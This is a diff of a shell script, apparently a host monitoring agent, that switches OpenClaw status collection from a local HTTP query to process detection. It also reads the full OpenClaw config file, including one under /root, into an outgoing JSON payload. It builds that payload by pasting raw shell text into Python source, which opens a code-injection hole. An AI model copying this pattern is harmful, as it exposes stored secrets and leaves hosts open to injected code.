@@ -50,17 +50,25 @@ SYS_INFO="::HOSTNAME::$(hostname 2>/dev/null)
 ::DISK::$(df -h / 2>/dev/null | awk 'NR==2{printf "%s %s %s %s", $2, $3, $4, $5}')
 ::CPU_USAGE::$(grep 'cpu ' /proc/stat 2>/dev/null | awk '{u=$2+$4; t=$2+$4+$5; if(t>0) printf "%d", u*100/t; else print "0"}' || echo '0')"
 
-# --- 3. OpenClaw 状态 ---
-CLAW_JSON="{}"
-if command -v curl &>/dev/null; then
-  CLAW_HTTP=$(curl -s -m 3 -o /tmp/.claw_status -w '%{http_code}' \
-    -H "Authorization: Bearer ${TOKEN}" \
-    "http://127.0.0.1:${CLAW_PORT}/status" 2>/dev/null || echo "000")
-  if [ "$CLAW_HTTP" = "200" ]; then
-    CLAW_JSON=$(cat /tmp/.claw_status 2>/dev/null || echo '{}')
-  fi
-  rm -f /tmp/.claw_status
+# --- 3. OpenClaw 状态（进程检测 + 配置文件读取） ---
+CLAW_RUNNING="false"
+CLAW_PID=""
+CLAW_CONFIG=""
+
+# 检测 openclaw-gateway 进程
+CLAW_PID=$(pgrep -f 'openclaw-gateway' 2>/dev/null | head -1 || true)
+if [ -n "$CLAW_PID" ]; then
+  CLAW_RUNNING="true"
 fi
+
+# 读取 OpenClaw 配置文件（常见路径）
+for cfg_path in "$HOME/.openclaw/openclaw.json" "/root/.openclaw/openclaw.json" "/opt/openclaw/config.json"; do
+  if [ -f "$cfg_path" ]; then
+    CLAW_CONFIG=$(cat "$cfg_path" 2>/dev/null || true)
+    CLAW_CONFIG_PATH="$cfg_path"
+    break
+  fi
+done
 
 END_MS=$(($(date +%s%N 2>/dev/null || echo "0") / 1000000))
 COLLECT_MS=$(( END_MS - START_MS ))
@@ -69,11 +77,25 @@ COLLECT_MS=$(( END_MS - START_MS ))
 # 使用 python3 安全构建 JSON
 PAYLOAD=$(python3 -c "
 import json, sys
+claw_config = {}
+try:
+    raw = '''${CLAW_CONFIG}'''
+    if raw.strip().startswith('{'):
+        claw_config = json.loads(raw)
+except: pass
+
+claw_obj = {
+    'running': ${CLAW_RUNNING},
+    'pid': '${CLAW_PID}' if '${CLAW_PID}' else None,
+    'configPath': '${CLAW_CONFIG_PATH:-}' or None,
+    'config': claw_config
+}
+
 payload = {
     'gnbStatus': '''${GNB_STATUS}''',
     'gnbAddresses': '''${GNB_ADDRS}''',
     'sysInfo': '''${SYS_INFO}''',
-    'openclaw': json.loads('''${CLAW_JSON}''') if '''${CLAW_JSON}'''.strip().startswith('{') else {},
+    'openclaw': claw_obj,
     'collectMs': ${COLLECT_MS:-0}
 }
 print(json.dumps(payload))
